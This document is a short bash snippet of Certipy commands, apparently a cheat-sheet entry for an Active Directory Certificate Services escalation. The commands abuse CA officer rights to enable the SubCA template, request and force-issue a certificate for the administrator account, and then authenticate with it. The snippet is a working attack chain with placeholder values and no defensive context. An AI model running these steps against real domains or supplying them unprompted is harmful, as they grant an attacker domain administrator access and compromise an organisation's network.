```bash
certipy ca -ca <ca_name> -add-officer <user> -u <user>@<domain> -p <password> -dc-ip <adcs_ip>
certipy ca -ca <ca_name> -enable-template SubCA -u <user>@<domain> -p <password> -dc-ip <adcs_ip>
certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template SubCA -upn administrator@<domain> -dc-ip <adcs_ip>
certipy ca -ca <ca_name> -issue-request <request_id> -u <user>@<domain> -p <password> -dc-ip <adcs_ip>
certipy req -u <user>@<domain> -p <password> -ca <ca_name> -retrieve <request_id> -dc-ip <adcs_ip>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

